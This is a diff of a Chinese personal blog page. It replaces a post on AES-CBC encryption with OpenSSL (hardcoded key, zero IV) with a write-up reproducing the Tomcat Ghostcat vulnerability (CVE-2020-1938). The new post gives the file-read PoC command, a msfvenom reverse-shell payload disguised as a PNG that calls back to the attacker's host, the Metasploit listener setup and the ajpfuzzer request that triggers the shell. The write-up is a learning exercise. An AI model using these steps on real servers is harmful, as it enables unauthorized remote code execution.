@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>使用Openssl库函数实现AES加密 | Guy-fawke&#39;s  warehouse</title>	
+<title> CVE-2020-1938 幽灵猫漏洞RCE 复现 | Guy-fawke&#39;s  warehouse</title>	
 
 <link rel="stylesheet" href="https://guy-Fawke.github.io/styles/main.css">
 <script type="text/javascript">
@@ -153,181 +153,83 @@ window.onload=getCSS();
 					<article id="post-70"
 						class="post-70 post type-post status-publish format-standard hentry category-5 tag-10 tag-9 tag-11">
 						<div class="entry-content">
-							<h1 class="wow swing entry-title">使用Openssl库函数实现AES加密</h1>
+							<h1 class="wow swing entry-title"> CVE-2020-1938 幽灵猫漏洞RCE 复现</h1>
 							<div class="entry-meta">
 								<div class="wow bounce">
-									<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-22 22:54:17"
-											itemprop="datePublished" pubdate="">2020-03-22</time></i>
+									<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-28 15:13:07"
+											itemprop="datePublished" pubdate="">2020-03-28</time></i>
 								</div>
 								</span>
 							</div>
 							<div class="wow slideInLeft entry-summary song">
-								<p>  之前在学习TCP/IP网络编程，涉及到客户端和服务器之间的加密通信，那给通信加密就是一件必然的事情了。之前学习加密算法，也是只在一门选修课上，荣幸的听教授讲解了一下，着实已经忘得差不多了，晚上的时候没事拿出之前的书看了一下，AES简单来说，总体加密过程就是结合秘钥，将置换和位置变换结合起来，形成了一种加密算法。</p>
-<h2 id="一-调用openssl库实行aes加密pkcs7填充cbc模式">一、调用openssl库实行AES加密（PKCS7填充CBC模式)</h2>
-<p>AES这其中有分有很多种模式，这里就不过多的做解释了，我们今天这里所使用的方式是ASES的PKCS7标准填充方式<s>哈哈，依旧按照我的习惯选择了最方便的一种</s>，采用CBC模式进行的加密。AES总归是一个模块化的加密算法，我们所采用的CBC模式说简单了就是前一个加密模块的内容会成为后续模块加密过程中的一部分，至于具体完整的加密流程，想要学习的人可以自行百度，由于着急使用，所以选择了一种较为简单直接的openssl函数库实现的，首先我们贴上一些接口函数</p>
-<pre><code class="language-C++">// 设置加解密秘钥
-int AES_set_encrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key);
-int AES_set_decrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key);
-
-AES_KEY aes;
-AES_set_encrypt_key(key,128,&amp;aes);
-// 这里填写的128是bit位，128bit=(128/8)bytes=16bytes，这个换算和32bit对应int为内存指针的原理一样。
-
-// 加密函数
-# define AES_ENCRYPT   1 // aes.h 63 lines
-# define AES_DECRYPT   0 // aes.h 64 line
-
-void AES_cbc_encrypt(const unsigned char *in, unsigned char *out, size_t length, const AES_KEY *key, unsigned char *ivec, const int enc);
-
-// 定义一个加密的初始化偏移向量
-unsigned char iv[16]；
-// 加密
-AES_cbc_encrypt(raw_buf,encrypt_buf,buf_size,&amp;aes,iv,AES_ENCRYPT);
-// 解密
-AES_cbc_encrypt(raw_buf,encrypt_buf,buf_size,&amp;aes,iv,AES_DECRYPT);
+								<p>漏洞原理作为一个菜鸡的我目前还不是很懂，但是这里记录一下，在之后一段过程的学习之后，希望能够回头看懂。→<a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ">传送门</a>。</p>
+<h2 id="一-任意文件读取复现">一、任意文件读取复现</h2>
+<p>POC不多说，直接去github上就可以下载，任意文件读取的方式也比较简单，代码只有一行：</p>
+<pre><code class="language-shell">python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f &quot;/WEB-INF/web.hml&quot; 192.168.0.1
 </code></pre>
-<p>这是接口函数，总体来说还是比较简单直接的，只需要传入需要加解密的字符地址，存放结果的地址，传入数据的大小，秘钥，偏移向量，和约定好的加解密Flag即可。</p>
-<p>之后这段代码是我在网上找到的，稍做了一些修改，让它更加的完整了一些，<a href="https://www.jb51.net/article/114358.htm">原地址在这里</a>。</p>
-<pre><code class="language-c++">// main.c
-#include &lt;openssl/aes.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;assert.h&gt;
-#include &lt;stdlib.h&gt;
-
-// 填充函数，将传入的字符串内容填充为16的整数倍
-unsigned char *padding_buf(unsigned char *buf, int size, int *final_size) {
-	unsigned char *ret = NULL;
-	int pidding_size = AES_BLOCK_SIZE - (size % AES_BLOCK_SIZE);
-	int i;
-	*final_size = size + pidding_size;
-	ret = (unsigned char *)malloc(size + pidding_size);
-	memcpy(ret, buf, size);
-	if (pidding_size != 0) {
-		for (i = size; i &lt; (size + pidding_size); i++) {
-			//// zero padding算法：
-			//ret[i] = 0;
-			// PKCS7Padding算法
-			ret[i] = pidding_size;
-		}
-	}
-	return ret;
-}
-
-// 这里是大佬里面带的打印函数，因为确实比较直观我就保留了下来，这样可以较为清楚的看到填充过程
-void printf_buff(unsigned char *buff, int size) {
-	int i = 0;
-	for (i = 0; i &lt; size; i++) {
-		printf(&quot;%02X &quot;, (unsigned char)buff[i]);
-		if ((i + 1) % 8 == 0) {
-			printf(&quot;\n&quot;);
-		}
-	}
-	printf(&quot;\n\n\n\n&quot;);
-}
-// 因为库函数的接口地方加解密就使用同一个，这里我就直接卸载一起了
-// 同时设置了一个长度值，用于获取加解密之后的长度结果
-// 当然，其实加密的时候，我们已经通过填充得到了加密的结果，这里主要还是解密后的内容
-void AES_AES(unsigned char *raw_buf, unsigned char *encrpy_buf, int len, int &amp;Final, int flag)
-{
-    // 初始化秘钥和便宜
-	AES_KEY aes;
-	unsigned char key_temp[] = &quot;1111111111111111&quot;;
-	unsigned char iv_temp[16] = { 0 };
-
-	if (flag == 1)
-	{
-		Final = len;
-		AES_set_encrypt_key(key_temp, 128, &amp;aes);
-		AES_cbc_encrypt(raw_buf, encrpy_buf, len, &amp;aes, iv_temp, AES_ENCRYPT);
-	}
-	else
-	{
-        // 解密过程中因为之前采取的填充模式为
-        // 加密字符串不足16的整数倍时，若缺N个字节，则填充N。
-        // 所以这里获取加密前字符长度的方式就是
-        // 读取解密结果的最后一个字节就知道填充了多少
-		int add;
-		AES_set_decrypt_key(key_temp, 128, &amp;aes);
-		AES_cbc_encrypt(raw_buf, encrpy_buf, len, &amp;aes, iv_temp, AES_DECRYPT);
-		add = encrpy_buf[len - 1];
-		Final = len - add;
-	}
-}
-
-int main(int argn, char *argv[]) {
-	unsigned char *after_padding_buf = NULL;
-	int padding_size = 0;
-	unsigned char *encrypt_buf = NULL;
-	unsigned char *decrypt_buf = NULL;
-	unsigned char original_content[] = &quot;All is Well !!&quot;;
-	int length_Of_result;
-
-	// original_content
-	printf(&quot;------------------raw_buf\n&quot;);
-	printf_buff(original_content, strlen((char*)original_content));
-	// after_padding
-	after_padding_buf = padding_buf(original_content, 		 strlen((char*)original_content), &amp;padding_size);
-	printf(&quot;------------------after_padding_buf\n&quot;);
-	printf_buff(after_padding_buf, padding_size);
-	// encrypted
-	encrypt_buf = (unsigned char *)malloc(padding_size);
-	AES_AES(after_padding_buf, encrypt_buf, padding_size, length_Of_result, 1);
-	printf(&quot;------------------encrypt_buf\n&quot;);
-	printf_buff(encrypt_buf, padding_size);
-	// decrypted
-	decrypt_buf = (unsigned char *)malloc(padding_size);
-	AES_AES(encrypt_buf, decrypt_buf, padding_size, length_Of_result, 0);
-	printf(&quot;------------------decrypt_buf\n&quot;);
-	printf_buff(decrypt_buf, padding_size);
-    
-    printf(&quot;------------------decrypt_buf2\n&quot;);
-    printf_buff(decrypt_buf, length_Of_result);
-    
-    // 保持一个良好的释放习惯
-    delete[]after_padding_buf;
-    delete[]encrypt_buf;
-    delete[]decrypt_buf;
-	return 0;
-}
+<p>-p &lt;端口&gt; -f&lt;文件路径&gt; <IP>，这里应为该漏洞的原因，AJP协议所使用的是8009端口，所以是固定值，只需要对其他两个参数进行修改即可，输入“-h”可以查看该POC的帮助信息，大佬果然还是想的全面的。</p>
+<figure data-type="image" tabindex="1"><img src="https://guy-Fawke.github.io/post-images/1585379706073.png" alt="命令执行结果" loading="lazy"></figure>
+<h2 id="二-命令执行">二、命令执行</h2>
+<p>这里我采用的方式是使用msf生成反弹马，简洁又方便~~（其实是我只会这个）~~。</p>
+<h5 id="1使用msf生成反弹shell马">1.使用msf生成反弹shell马</h5>
+<p>这个就不用过多解释了：</p>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.2 LPORT=4567 R &gt;shell.png
 </code></pre>
-<p>这个代码写的还是比较清晰易懂的，所以接下来就没有过多的解释了，这里直接贴出结果。</p>
-<figure data-type="image" tabindex="1"><img src="https://guy-Fawke.github.io/post-images/1584888926327.png" alt="" loading="lazy"></figure>
-<p>因为我们输入的内容为&quot;All is Well !!&quot;，共计14个字节，所以填充时在末尾补入02至16个字节，之后进行加解密，这里就比较直观能看出，这里我也最终打印出了两个解密结果，一个是直接解密后的结果，可以看到末尾就是填充的字符数，只需要简单计算后就可得到加密前原始数据的长度了。</p>
-<hr>
-<h2 id="二-配置openssl库">二、配置openssl库</h2>
-<p>思来想去还是决定把openssl这个库函数的配置过程记录下来。<a href="https://www.openssl.org/source/">Openssl官网下载</a>哈哈，然而我并不是在管网直接下的，当时我找到的是<a href="http://slproweb.com/products/Win32OpenSSL.html">这里！！！</a>。那我这里就简单的讲一下我配置的过程。</p>
+<p>所使用的payload类型选择 “java/jsp_shell_reverse_tcp ”，之后是反弹的IP和端口，至于后面那个“R”是什么我也不清楚，这个我需要查一下。之后有空学习这方面的时候，应该是会有一篇专门的总结的，这里也记录一下提醒自己。</p>
+<h5 id="2在msf启动监听">2.在msf启动监听</h5>
+<p>这里主要是命令操作msf，也进行简单的记录</p>
+<pre><code class="language-shell">use exploit/multi/handler
+set LHOST 127.0.0.1
+set LPORT 9999
+set payload java/jsp_shell_reverse_tcp
+show options
+</code></pre>
+<p><img src="https://guy-Fawke.github.io/post-images/1585379796204.png" alt="" loading="lazy"><br>
+先选择我们使用的模块，然后设定监听的IP和端口，选择我们的payload，最后查看一下设置，是我个人习惯，毕竟确定一下不是什么坏事。这里就等待执行就可以了。</p>
+<h5 id="3构造ajp包">3.构造AJP包</h5>
+<p>这里也是今天才学会的，用到的是AJP包构造器<a href="https://github.com/doyensec/ajpfuzzer/releases/download/v0.6/ajpfuzzer_v0.6.jar">ajpfuzzer</a>。</p>
 <ol>
-<li>根据所要生成的文件是X64还是X86的选择对应的版本，进行安装，安装的时候记清楚自己的安装路径。</li>
-<li>在VS2017中添加之前下载好的函数库路径。<br>
-<img src="https://guy-Fawke.github.io/post-images/1584889094209.png" alt="" loading="lazy"></li>
-<li>添加索要用到的静态链接库<br>
-<img src="https://guy-Fawke.github.io/post-images/1584889100222.png" alt="" loading="lazy"></li>
-<li>将所需的动态链接库拷贝到文件夹中。<br>
-<img src="https://guy-Fawke.github.io/post-images/1584889108249.png" alt="" loading="lazy"></li>
+<li>
+<p>java -har ajpfuzzer_v0.6.har</p>
+</li>
+<li>
+<p>connect 192.168.0.2 8009</p>
+</li>
+<li>
+<p>运行指令：</p>
+<pre><code class="language-shell">forwardrequest 2 &quot;HTTP/1.1&quot; &quot;/123.jsp&quot; 127.0.0.1 127.0.0.1 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:11.jsp&quot;,&quot;javax.servlet.include.path_info:/WEB-INF/shell.png&quot;,&quot;javax.servlet.include.servlet_path:/&quot;
+</code></pre>
+</li>
 </ol>
-<hr>
-<h3 id="总结">总结</h3>
-<p>选择用Openssl实现AES加密，也是我第一次尝试对数据内容加密，总体来说因为实现过程较为简单，所以还是非常顺利的，当时因为脑袋卡克，在解密之后计算原始数据长度的时候居然一时没有想到，哈哈，也是非常尴尬的。调用函数库实现加密，给了我们极大的便利，但是同样也值得我们注意的是，首先因为函数库的关系，调用AES头文件和链接库，在静态编译的过程中会加大所编译文件的大小；其次，由于Openssl函数库的强大功能，使得它在使用时不得不带着两个动态链接库，我最后改掉这个加密也是因为这个原因，带着所需要的动态库实在是让我有点难受。总体来说有舍有得，在本地加密时，确实也是一个不错的选择！！<s>便于偷懒</s>。</p>
+<figure data-type="image" tabindex="2"><img src="https://guy-Fawke.github.io/post-images/1585379894316.png" alt="" loading="lazy"></figure>
+<p>指令中“/123.jsp”是一个该web项目中没有的jsp文件，这样tomcat才会去调用存在漏洞的地方，&quot;/WEB-INF/shell.png&quot;为自己的马上传的文件路径。</p>
+<h5 id="4得到shell">4.得到shell</h5>
+<p>都已经准备完毕了，享受最后成果：运行msf开始监听，然后发送之前构造好的包，即可得到shell。<br>
+<img src="https://guy-Fawke.github.io/post-images/1585379973586.png" alt="" loading="lazy"><br>
+这里收到连接之后由于太久没用，傻掉了，连接回来之后是可以进行下一步操作的，我这里等到连接都断开了还以为没连接成功 = =，尴尬，第二次连接回来才想起来用shell命令。<br>
+<img src="https://guy-Fawke.github.io/post-images/1585379982900.png" alt="" loading="lazy"></p>
+<h2 id="总结">总结</h2>
+<p>总的来说，这次是第一次尝试复现CVE漏洞，一是因为一个好的机遇遇到了能做题的环境，二是关注到了最近所爆出的大型漏洞，所以第一时间想到了。感觉还是比较舒服的，也挺有成就感的，所以这里专门记录了下来，美中不足的是这次没有尝试提权。希望在之后的学习过程中，自己能够看懂这个漏洞产生的原因，以及写出自己的POC，能够自己独立完成一系列工作。</p>
 
 							</div>
 							<div class="wow bounceInDown vt-post-tags">
 								
-								<a href="https://guy-Fawke.github.io/tag/y5vZ-Gaeh/" rel="tag">AES加密</a>
+								<a href="https://guy-Fawke.github.io/tag/Ci-d07oxf/" rel="tag">CVE</a>
 								
-								<a href="https://guy-Fawke.github.io/tag/KzcE85i1X/" rel="tag">网络编程</a>
+								<a href="https://guy-Fawke.github.io/tag/PE3dwdQe4g/" rel="tag">复现</a>
+								
+								<a href="https://guy-Fawke.github.io/tag/2k51vU1za/" rel="tag">CTF</a>
+								
+								<a href="https://guy-Fawke.github.io/tag/i5bMzEjFBd/" rel="tag">Web</a>
 								
 							</div>
 							<nav class="navigation3 post-navigation3" role="navigation">
 
 								<div class="nav-links3">
 									
-									<div class="wow bounceInLeft nav-previous3"><a href="https://guy-Fawke.github.io/post/CVE/"
-											rel="prev">  CVE-2020-1938 幽灵猫漏洞RCE 复现</a></div>
 									
-									
-									<div class="wow bounceInRight nav-next3"><a href="https://guy-Fawke.github.io/post/Socket/"
-											rel="next"> 基于socket的S/C计算器</a></div>
+									<div class="wow bounceInRight nav-next3"><a href="https://guy-Fawke.github.io/post/AES/"
+											rel="next"> 使用Openssl库函数实现AES加密</a></div>
 									
 								</div>
 							</nav>
